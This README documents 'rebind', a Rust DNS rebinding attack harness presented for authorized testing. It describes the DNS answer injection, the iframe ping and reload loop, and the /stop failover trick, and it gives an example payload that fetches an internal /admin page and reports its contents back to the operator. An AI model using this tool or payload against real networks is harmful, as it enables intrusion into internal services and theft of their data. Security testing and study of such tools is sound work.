# rebind

A DNS rebinding test harness for **authorized security testing**, built on the
tokio async runtime.

Built with:

- [`hickory-server`](https://crates.io/crates/hickory-server) / `hickory-proto` — DNS server
- [`axum`](https://crates.io/crates/axum) / [`tokio`](https://crates.io/crates/tokio) — the two HTTP servers
- `tracing` / `tracing-subscriber` — logging

## Components

1. **DNS nameserver** — answers A and AAAA queries by decoding the requested IP
   addresses directly from the queried subdomain labels.
2. **Master / orchestrator server** — HTTP on port `3000`. Renders one iframe
   per target and drives the rebinding attempt (see below).
3. **Standard-port server** — HTTP on port `80`. Serves the rebind frame, a
   `/rebind-probe` sentinel, and `GET /stop`, which temporarily takes the
   server offline to force failover.

## Projects

The master site (port 3000) is a small dashboard for managing **projects**. A
project is the per-campaign attack config: **targets**, **stop window**, and the
**JS payload**. Projects are stored as JSON under `./projects/` (override with
`REBIND_PROJECTS_DIR`).

Deployment/infrastructure settings are **`.env`-only** and not part of any
project: the listen/bind addresses, `REBIND_DNS_TTL`, `REBIND_SERVER_IP`, ports,
the delegated worker domain `REBIND_HOSTNAME`, and the optional separate master
base URL `REBIND_MASTER_URL`. The dashboard shows these read-only.

- **Dashboard** (`/`): list/open projects, create a new one (targets + stop +
  payload seeded from `.env`), edit, and Save.
- **Runner** (`/run`): drives the rebinding attempt using the **active**
  project for targets/stop/payload and the `.env` deployment values for
  hostname/server IP/port. Opening or saving a project makes it active
  immediately — the runner page and the rebind frame's payload update without a
  restart.

On startup the active project (`"default"`) is seeded from `REBIND_TARGETS`,
`REBIND_STOP_SECONDS`, and the payload file, so `.env` provides the defaults.

API (used by the dashboard): `GET /api/projects`, `GET /api/defaults`,
`GET /api/deploy`, `GET|POST /api/project/:name`, `POST /api/open/:name`,
`GET|POST /api/active`.

## Rebinding flow

The runner page builds one iframe per configured target, each with host
`<target_ip>.<random>.<REBIND_HOSTNAME>`. **All iframe communication is over JS
web messages (`postMessage`).**

1. DNS decodes `target_ip` from the name and injects our `server_ip` (from
   config) into the A answer, so the browser sees both addresses and connects to
   `server_ip` first — each iframe loads our rebind frame.
2. The master **pings** each iframe. Only our frame page answers with a
   **pong**, so a pong proves the iframe is currently pointing at *our* server.
3. Any iframe that fails to pong is **reloaded with a fresh random label**,
   forcing a new (uncached) DNS lookup, and is pinged again — repeating until
   it points at our server.
4. Once every iframe has ponged, the master calls `/stop` on `server_ip` and
   sends each iframe an **execute** message.
5. With `server_ip` refusing connections, the browser fails over to `target_ip`
   for the same origin. Each frame's `execute` handler runs the **placeholder
   payload** (`runPayload()` in the frame page) same-origin against the target
   and reports the result back to the master log.

The runner page itself is served by the master and can live at its own base URL
(`REBIND_MASTER_URL`, TLS-terminating proxy fine), separate from the worker base
domain (`REBIND_HOSTNAME`) the iframes resolve.

## Configurable payload

The payload that runs inside each iframe after rebinding is loaded from a JS
file at startup (`REBIND_PAYLOAD_FILE`, default `payload.js`) — no rebuild
needed. The file must define:

```js
async function runPayload(rebind) {
  // runs same-origin against the rebound target
  const res = await fetch("/admin", { cache: "no-store" });
  rebind.report({ status: res.status, body: (await res.text()).slice(0, 500) });
}
```

The harness calls `runPayload(rebind)` once when the master signals `execute`
and passes a `rebind` helper:

| Member | Purpose |
|--------|---------|
| `rebind.host` | the current origin hostname (the attacker domain) |
| `rebind.report(data)` | send a result (any JSON-serializable value) to the master log |
| `rebind.error(err)` | report an error to the master |

The payload may be sync or async; thrown or rejected errors are reported
automatically. If the file is unset or unreadable, a built-in default payload
is used. See [`payload.js`](payload.js) for a worked example.

## Subdomain encoding

Each label of the queried name is decoded independently:

| Form | Example label | Record |
|------|---------------|--------|
| IPv4 — four decimal octets | `192-168-1-1` | A `192.168.1.1` |
| IPv6 — hex groups, `z` = `::` | `2001-db8-z-1` | AAAA `2001:db8::1` |
| IPv6 — fully expanded | `2001-db8-0-0-0-0-0-1` | AAAA `2001:db8::1` |

Stack labels to return multiple records:

```
192-168-1-1.10-0-0-1.rebind.example.com   ->  A 192.168.1.1 + A 10.0.0.1
```

Labels that don't parse as an IP (base domain, etc.) are ignored.

A rebind name only needs to carry the **target** IP — the server's own IP is
known from config (`REBIND_SERVER_IP`) and injected into every A answer that
decoded a target, so the runner emits `<target>.<random>.rebind.example.com`:

```
192-168-1-1.k3f9zq.rebind.example.com   ->  A 192.168.1.1 + A <server IP>×(1+pad)
```

The server IP is always added once (the anchor the browser lands on first),
plus `REBIND_DNS_PAD` extra copies; `/stop` then fails the browser over to the
target. The whole answer is returned in randomized order.

**AAAA queries** are handled separately: they return **only** the configured
`REBIND_SERVER_IP6` (a single record), never the target. This keeps the rebind
on the v4 path we control — a dual-stack browser can't reach the target over
IPv6 and skip the `/stop` timing. With `REBIND_SERVER_IP6` unset, AAAA is empty
(NODATA).

## Build & run

```sh
cargo build --release

# Privileged ports (53/80) need root:
sudo ./target/release/rebind

# Or run unprivileged on high ports:
REBIND_DNS_BIND=0.0.0.0:5353 \
REBIND_STANDARD_BIND=0.0.0.0:8080 \
  ./target/release/rebind
```

Log verbosity is controlled with `RUST_LOG` (e.g. `RUST_LOG=rebind=debug`).

### Configuration (environment variables)

Copy [`.env.example`](.env.example) to `.env` and edit it — the binary loads
`.env` automatically on startup. Real environment variables take precedence
over values in `.env`.

| Variable | Default | Purpose |
|----------|---------|---------|
| `REBIND_DNS_BIND` | `0.0.0.0:53` | DNS UDP bind address |
| `REBIND_DNS_TTL` | `0` | TTL on answers (0 = no caching) |
| `REBIND_DNS_PAD` | `0` | seeds a project's DNS padding — extra `REBIND_SERVER_IP` copies returned alongside the target (the server IP is always included once), max 16; editable per-project under the dashboard's Advanced settings |
| `REBIND_CONTENT_BIND` | `0.0.0.0:3000` | master server bind (wildcard ⇒ dual-stack IPv4+IPv6) |
| `REBIND_STANDARD_BIND` | `0.0.0.0:80` | standard-port server bind (wildcard ⇒ dual-stack IPv4+IPv6) |
| `REBIND_HOSTNAME` | `rebind.example.com` | rebind-worker base domain delegated to the DNS server |
| `REBIND_MASTER_URL` | _(unset)_ | public base URL (scheme+host+port, TLS ok) for the master/runner when separate from the workers; used to build the runner link (else the dashboard origin) |
| `REBIND_SERVER_IP` | `127.0.0.1` | our IPv4 server IP, injected into A answers as the anchor (tried first) |
| `REBIND_SERVER_IP6` | _(unset)_ | our IPv6 server IP; AAAA queries return **only** this single address (target never exposed over IPv6). Unset → AAAA NODATA |
| `REBIND_TARGETS` | `127.0.0.1` | comma-separated target IPs (one iframe each) |
| `REBIND_STOP_SECONDS` | `30` | offline window the master requests on `/stop` |

## Quick test

```sh
# A query: the target is decoded from the name and this server's IP
# (REBIND_SERVER_IP) is injected as the anchor + REBIND_DNS_PAD extra copies,
# all in randomized order. With the defaults (server 127.0.0.1, pad 0):
dig @127.0.0.1 -p 5353 192-168-1-1.k3f9zq.rebind.test A +short
# -> 192.168.1.1
#    127.0.0.1      (+ REBIND_DNS_PAD extra copies, shuffled)

# AAAA returns ONLY REBIND_SERVER_IP6 (here 2001:db8::1) — never the target:
dig @127.0.0.1 -p 5353 192-168-1-1.k3f9zq.rebind.test AAAA +short
# -> 2001:db8::1

# Pause the standard-port server for 15 seconds:
curl "http://127.0.0.1:8080/stop?seconds=15"
```

## Tests

```sh
cargo test
```
